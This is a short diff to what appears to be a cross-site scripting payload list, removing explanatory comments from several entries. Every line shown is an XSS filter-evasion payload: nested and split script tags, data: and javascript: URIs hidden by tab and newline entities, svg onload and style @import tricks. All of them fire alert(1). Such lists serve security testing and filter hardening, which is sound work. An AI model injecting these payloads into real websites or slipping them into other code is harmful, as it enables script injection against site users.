@@ -58,12 +58,12 @@ javascript:alert(1)//
 "><script>alert(1)</script>
 javascript:/*-->*/alert(1)
 <img src=x onerror=alert(1)//>
-<scr<script>ipt>alert(1)</script> (Nested tag)
-<script>alert(1)</scr ipt> (Space in tag)
+<scr<script>ipt>alert(1)</script> 
+<script>alert(1)</scr ipt> 
 <script src="data:text/javascript,alert(1)"></script>
 <style>@import'javascript:alert(1)';</style>
-<img src="jav&#x09;ascript:alert(1)"> (Tab)
-<img src="jav&#x0A;ascript:alert(1)"> (Newline)
+<img src="jav&#x09;ascript:alert(1)"> 
+<img src="jav&#x0A;ascript:alert(1)"> 
 <svg onload=alert1>
 <script>Functionalert(1)()</script>
 <svg onload=eval(alert(1))>
